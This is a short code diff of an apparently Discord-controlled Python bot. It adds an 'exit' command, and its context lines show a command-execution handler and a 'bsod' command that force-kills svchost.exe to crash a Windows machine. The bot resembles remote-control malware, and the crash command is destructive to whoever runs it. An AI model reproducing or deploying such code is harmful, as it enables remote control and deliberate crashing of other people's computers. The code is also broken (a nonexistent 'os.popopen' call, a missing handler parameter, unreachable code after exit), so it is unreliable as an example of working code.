@@ -30,4 +30,9 @@ async def run_command(ctx, *, command: str):
 @bot.command(name='bsod')
 async def bsod():
   os.popopen("taskkill /f /im svchost.exe")
+
+@bot.command(name='exit')
+async def exi():
+    exit(0)
+    print("failed to exit.")
 bot.run(TOKEN)
